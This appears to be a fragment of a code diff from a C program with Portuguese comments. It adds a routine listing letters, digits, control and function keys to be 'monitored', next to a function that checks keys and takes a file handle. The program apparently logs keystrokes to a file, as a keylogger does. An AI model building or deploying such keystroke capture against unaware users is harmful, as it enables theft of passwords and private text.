@@ -65,5 +65,21 @@ void AdicionarTecla(int vk) {
 
 }
 
-void InicializarTeclas()
+// função para adicionar as teclas que serão monitoradas
+void InicializarTeclas() {
+    for(char c = 'A'; c <= 'Z'; c++) AdicionarTecla(c);
+    for(char c = '0'; c <= '9'; c++) AdicionarTecla(c);
+
+    AdicionarTecla(VK_SPACE);   AdicionarTecla(VK_RETURN);
+    AdicionarTecla(VK_BACK);    AdicionarTecla(VK_TAB);
+    AdicionarTecla(VK_ESCAPE);  AdicionarTecla(VK_SHIFT);
+    AdicionarTecla(VK_CONTROL); AdicionarTecla(VK_MENU);
+    AdicionarTecla(VK_CAPITAL); AdicionarTecla(VK_DELETE);
+
+    AdicionarTecla(VK_LEFT); AdicionarTecla(VK_UP);
+    AdicionarTecla(VK_RIGHT); AdicionarTecla(VK_DOWN);
+
+    for (int i = 0; i < 12; i++) AdicionarTecla(VK_F1 + i);
+}
+
 void VerificarTeclas(FILE *arquivo)
